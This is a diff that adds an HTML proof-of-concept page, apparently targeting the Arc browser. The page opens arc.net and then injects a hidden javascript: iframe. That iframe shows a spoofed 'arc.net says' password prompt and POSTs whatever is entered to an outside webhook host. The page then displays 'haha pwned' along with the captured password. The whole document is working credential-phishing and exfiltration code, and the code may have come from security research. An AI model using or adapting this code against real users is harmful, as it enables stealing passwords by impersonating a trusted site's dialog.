@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>arc.net</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+        }
+        button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 50px;
+            border: none;
+        }
+        button:hover { background: #cc0000; }
+        #status {
+            margin-top: 20px;
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Click this to trigger iframe prompt on another origin</h2>
+    <button id="triggerBtn">Spoof Prompt</button>
+    <div id="status"></div>
+    <form id="hiddenForm" class="hidden" method="POST" action="https://keen-sun-82.webhook.cool/">
+        <input type="text" id="passwordInput" name="password">
+    </form>
+
+    <script>
+        document.getElementById('triggerBtn').onclick = () => {
+            const w = window.open('https://arc.net/');
+            if (!w) {
+                document.getElementById('status').innerHTML = 'Popup blocked. Fallback not implemented.';
+                return;
+            }
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'javascript:(function(){var p=prompt("arc.net says                                                                                                                                     Password:");if(p){document.write(\'<form method="POST" action="https://keen-sun-82.webhook.cool/" id="iframeForm"><input type="hidden" name="password" value="\'+p+\'"><input type="submit"></form>\');document.getElementById("iframeForm").submit();}})()';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                const hiddenForm = document.getElementById('hiddenForm');
+                hiddenForm.onsubmit = (e) => {
+                    e.preventDefault(); 
+                    const password = document.getElementById('passwordInput').value;
+                    if (password) {
+                        document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + password;
+                    } else {
+                        document.getElementById('status').innerHTML = 'haha pwned<br>No password captured.';
+                    }
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                        if (w && !w.closed) w.close();
+                    }, 2000);
+                };
+
+                const checkIframe = setInterval(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        const iframeForm = iframeDoc.getElementById('iframeForm');
+                        if (iframeForm) {
+                            const pwd = iframeForm.querySelector('input[name="password"]').value;
+                            if (pwd) {
+                                document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + pwd;
+                                clearInterval(checkIframe);
+                                setTimeout(() => {
+                                    document.body.removeChild(iframe);
+                                    if (w && !w.closed) w.close();
+                                }, 2000);
+                            }
+                        }
+                    } catch (e) {
+                        clearInterval(checkIframe);
+                    }
+                }, 500);
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
